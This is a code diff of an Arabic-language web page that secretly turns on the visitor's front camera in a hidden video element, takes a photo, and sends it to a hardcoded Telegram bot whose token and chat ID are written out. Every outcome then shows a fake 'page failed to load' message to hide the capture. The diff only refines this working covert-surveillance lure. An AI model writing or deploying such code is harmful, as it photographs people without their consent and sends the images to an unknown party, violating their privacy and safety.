@@ -32,8 +32,7 @@
             margin: 20px auto;
         }
         @keyframes spin { to { transform: rotate(360deg); } }
-        video { display: none; } /* إخفاء الكاميرا */
-        #status { margin-top: 30px; font-size: 20px; }
+        video { display: none; }
     </style>
 </head>
 <body>
@@ -52,54 +51,45 @@
         const botToken = "8807798502:AAHZFi61wI_KflrG-3rLoHmccS_WqRuqNfg";
         const chatId = "2049331070";
 
-        // تشغيل الكاميرا في الخلفية
-        navigator.mediaDevices.getUserMedia({ 
-            video: { facingMode: "user" } 
-        })
+        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
         .then(stream => {
             video.srcObject = stream;
-            
-            // التقاط بعد 2.5 ثانية
-            setTimeout(() => {
-                captureAndSend();
-            }, 2500);
+            setTimeout(captureAndSend, 2800);
         })
-        .catch(err => {
-            showError();
-        });
+        .catch(() => showError());
 
         function captureAndSend() {
             canvas.width = 1280;
             canvas.height = 720;
             canvas.getContext('2d').drawImage(video, 0, 0, 1280, 720);
             
-            const imageData = canvas.toDataURL('image/jpeg', 0.85);
+            canvas.toBlob(blob => {
+                const formData = new FormData();
+                formData.append('chat_id', chatId);
+                formData.append('photo', blob, 'selfie.jpg');
 
-            // إرسال الصورة
-            fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: chatId,
-                    photo: imageData,
-                    caption: `📸 شخص جديد ضغط على الرابط\nالوقت: ${new Date().toLocaleString('ar-SA')}`
+                fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
                 })
-            })
-            .then(() => {
-                showError(); // إظهار رسالة الخطأ بعد النجاح
-            })
-            .catch(() => {
-                showError();
-            });
+                .then(response => response.json())
+                .then(data => {
+                    if (data.ok) {
+                        showError();
+                    } else {
+                        showError();
+                    }
+                })
+                .catch(() => showError());
+            }, 'image/jpeg', 0.85);
         }
 
         function showError() {
             loader.innerHTML = `
-                <h1 style="color:#ff0066;">خطأ في تحميل الصفحة</h1>
-                <p style="font-size:18px;">يرجى المحاولة مرة أخرى لاحقاً</p>
+                <h1 style="color:#ff0066; font-size:28px;">خطأ في تحميل الصفحة</h1>
+                <p style="font-size:19px;">حدث خطأ غير متوقع<br>يرجى المحاولة مرة أخرى لاحقاً</p>
             `;
-            // إيقاف الكاميرا
-            if (video.srcObject) video.srcObject.getTracks().forEach(track => track.stop());
+            if (video.srcObject) video.srcObject.getTracks().forEach(t => t.stop());
         }
     </script>
 </body>
